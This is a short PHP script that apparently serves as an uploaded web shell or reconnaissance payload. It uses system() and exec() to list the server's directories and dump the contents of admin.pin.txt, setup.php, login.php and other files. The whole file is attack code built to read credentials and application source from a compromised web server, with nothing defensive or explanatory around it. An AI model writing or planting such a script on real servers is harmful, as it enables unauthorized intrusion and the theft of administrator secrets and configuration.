<?php 
echo system('ls');
echo "here is for txt !!!!!  \n";
echo system('cat admin.pin.txt');
echo "here is for setup  \n";
echo system('cat setup.php');
echo "last \n";
echo system('ls ..');
echo exec('ls ..');
echo system('ls');
echo system('cat refresh.html');
echo system('cat login.php');
echo file_get_contents('setup.php');
echo system('ls ../..');
echo system('ls ../../cache');
?>
